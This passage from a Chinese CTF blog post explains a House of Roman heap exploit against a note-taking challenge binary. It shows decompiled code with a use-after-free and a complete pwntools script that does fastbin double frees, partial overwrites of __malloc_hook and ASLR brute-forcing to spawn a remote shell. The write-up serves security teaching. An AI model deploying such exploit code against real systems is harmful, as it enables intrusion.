class="hljs-type">int</span>)dword_202048[<span class="hljs-number">4</span> * v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not allow~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>free存在UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_E1E</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the note index:&quot;</span>);<br>  v1 = sub_A80();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0x11</span> &amp;&amp; dword_202048[<span class="hljs-number">4</span> * v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;unk_202040 + <span class="hljs-number">2</span> * (<span class="hljs-type">int</span>)v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not allow~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>House of roman，需要爆破12bits的数据<br><em><strong>堆风水呜呜呜</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> traceback<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_note</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Input the note length:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Input the note content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Input the note index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;Input the note content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free_note</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Choice:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Input the note index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">with</span> context.quiet:<br>    try_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># since we are replacing some addresses partially, and ASLR is enabled</span><br>    <span class="hljs-comment"># we are executing the program over and over again until we get lucky</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            try_count += <span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span> (sys.stderr, <span class="hljs-string">&#x27;Try #&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(try_count))<br><br>            <span class="hljs-comment">#p = process(&#x27;./program&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.23.so&#x27;&#125;)</span><br>            p = remote(<span class="hljs-string">&quot;192.168.63.133&quot;</span>, <span class="hljs-number">10001</span>)<br>            <span class="hljs-comment"># chunk#0 (0x81)</span><br>            init_note(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#1 (0x81)</span><br>            init_note(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#2 (0x91)</span><br>            init_note(<span class="hljs-number">0x78</span>, <span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#3 (0x71)</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#4 (0x71)</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;e&#x27;</span> * <span class="hljs-number">255</span>)<br><br>            <span class="hljs-comment"># launch double free attack</span><br>            <span class="hljs-comment"># fastbin free list (0x80): chunk#0 --&gt; chunk#1 --&gt; chunk#0</span><br>            free_note(<span class="hljs-number">0</span>)<br>            free_note(<span class="hljs-number">1</span>)<br>            free_note(<span class="hljs-number">0</span>)<br><br>            <span class="hljs-comment"># chunk#5 (0x81)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#0, so we partially overwrite the fd pointer</span><br>            init_note(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0xe0</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>            <span class="hljs-comment"># chunk#6 (0x81)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#1</span><br>            init_note(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x50</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(<span class="hljs-number">0</span>))<br>            <span class="hljs-comment"># chunk#7 (0x81)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#0, so we partially overwrite the fd pointer</span><br>            <span class="hljs-comment"># after this allocation will put a heap address in fastbin free list</span><br>            init_note(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">255</span>)<br><br>            <span class="hljs-comment"># freeing chunk#2 will put it in the unsorted bin and set the fd/bk pointers with libc address</span><br>            free_note(<span class="hljs-number">2</span>)<br><br>            <span class="hljs-comment"># chunk#8 (0x81)</span><br>            <span class="hljs-comment"># this chunk is a fake chunk which is located a little before chunk#2</span><br>            <span class="hljs-comment"># basically, we overwrite chunk#2&#x27;s size and partially its fd which is pointing to somewhere before malloc_hook</span><br>            <span class="hljs-comment"># the first 12 bits is fixed, but the next 4 bits have to be 1</span><br>            init_note(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p16(<span class="hljs-number">0x1aed</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>            <span class="hljs-comment"># launch double free attack</span><br>            <span class="hljs-comment"># fastbin free list (0x70): chunk#4 --&gt; chunk#3 --&gt; chunk#4</span><br>            free_note(<span class="hljs-number">4</span>)<br>            free_note(<span class="hljs-number">3</span>)<br>            free_note(<span class="hljs-number">4</span>)<br><br>            <span class="hljs-comment"># chunk#9 (0x71)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#4, so we partially overwrite the fd pointer to somewhere before malloc_hook</span><br>            init_note(<span class="hljs-number">0x60</span>, p8(<span class="hljs-number">0x00</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>            <span class="hljs-comment"># chunk#10 (0x71)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#3</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#11 (0x71)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#4</span><br>            <span class="hljs-comment"># after this allocation, address of chunk#2 will be put in the fastbin free list</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">255</span>)<br>            <span class="hljs-comment"># chunk#12 (0x71)</span><br>            <span class="hljs-comment"># this chunk is co-located with chunk#2</span><br>            <span class="hljs-comment"># after this allocation, the address before malloc_hook will be put in the fastbin free list</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>            <span class="hljs-comment"># chunk#13 (0x7f)</span><br>            <span class="hljs-comment"># this chunk is located before __malloc_hook</span><br>            init_note(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>            <span class="hljs-comment"># fix unsorted bin chunk#2 size to look like a non-fastbin chunk</span><br>            <span class="hljs-comment"># also overwrite bk pointer of chunk#2 which points to 16 bytes before __malloc_hook</span><br>            <span class="hljs-comment"># preparing for unsorted_bin_attack</span><br>            edit_note(<span class="hljs-number">8</span>, <span class="hljs-number">0x29</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0x00</span>))<br><br>            <span class="hljs-comment"># chunk#14 (0x91)</span><br>            <span class="hljs-comment"># allocate a chunk from unsorted bin, so the __malloc_hook will be overwritten with a libc address</span><br>            init_note(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>            <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">            constraints:</span><br><span class="hljs-string">                [rsp+0x30] == NULL</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            <span class="hljs-comment"># overwrite __malloc_hook partially to point to the one gadget</span><br>            <span class="hljs-comment"># the first 12 bits is fixed, but the next 12 bits have to be a52</span><br>            edit_note(<span class="hljs-number">13</span>, <span class="hljs-number">0x13</span> + <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x13</span> + p32(<span class="hljs-number">0xa5226a</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>])<br><br>            <span class="hljs-comment"># chunk#15</span><br>            <span class="hljs-comment"># trigger __malloc_hook</span><br>            init_note(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>            p.clean()<br>            p.sendline(<span class="hljs-string">b&#x27;ls&#x27;</span>)<br>            p.recv(<span class="hljs-number">0</span>)<br><br>            p.interactive()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> EOFError:<br>            p.close()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span> ( sys.stderr, traceback.format_exc())<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/27/the-balt-and-road-final/">← 下一篇 the_balt_and_road_final</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/11/11/house-of-botcake/">house_of_botcake 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>